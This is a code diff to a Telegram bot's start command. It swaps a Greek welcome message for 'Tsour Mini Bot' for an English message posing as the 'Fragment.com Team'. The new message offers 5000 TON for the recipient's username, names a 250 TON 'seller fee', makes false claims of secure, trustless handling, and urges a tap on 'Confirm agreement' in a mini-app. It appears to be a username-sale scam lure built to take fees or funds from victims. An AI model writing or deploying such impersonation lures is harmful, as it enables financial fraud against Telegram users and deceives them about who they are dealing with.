@@ -29,13 +29,23 @@ bot.start((ctx) => {
   const displayName = ctx.from?.username ? `@${ctx.from.username}` : raw;
   const message =
     `👋 Hi, ${displayName}\n\n` +
-    `Καλωσήρθες στο Tsour Mini Bot. Με αυτό το mini app μπορείς να βλέπεις τις προσφορές σου, τις κινήσεις σου και να κάνεις γρήγορες ενέργειες απευθείας μέσα από το Telegram.\n\n` +
-    `📱 Mini app:\n` +
-    `• Πάτα το κουμπί από κάτω για να ανοίξεις το mini app.\n` +
-    `• Μπορείς να επιστρέφεις όποτε θέλεις στέλνοντας /start ξανά.\n\n` +
-    `⚠ Important:\n` +
-    `• Όλες οι ενέργειες γίνονται μέσα από το ασφαλές mini app.\n` +
-    `• Για ερωτήσεις ή υποστήριξη, επικοινώνησε με την ομάδα μας.`;
+    `We'd like to present you with a direct buy offer for your distinctive username.\n\n` +
+    `The transaction will be processed through the official 🔐 Fragment.com service, ensuring full security and automatic, trustless execution.\n\n` +
+    `📄 Offer details:\n\n` +
+    `💰 Amount offered: 5000 TON\n` +
+    `🪙 Buyer fee: 5% (paid by the buyer)\n` +
+    `🪙 Seller fee: 250 TON\n\n` +
+    `⚠️ Important:\n\n` +
+    `• After confirmation, ${displayName} will be issued as a collectible.\n` +
+    `• The transfer is permanent and cannot be reversed.\n` +
+    `• If you do not wish to sell, you may safely ignore this notification.\n\n` +
+    `💡 Why accept:\n\n` +
+    `• Secure by design: handled entirely within Fragment.com.\n` +
+    `• Fast payout: funds arrive instantly on-chain once completed.\n` +
+    `• Monetization: turn a rare username into a tangible asset.\n\n` +
+    `✅ Tap "Confirm agreement" to proceed in the mini-app.\n\n` +
+    `Best regards,\n` +
+    `Fragment.com Team`;
 
   return ctx.reply(message, {
     reply_markup: {
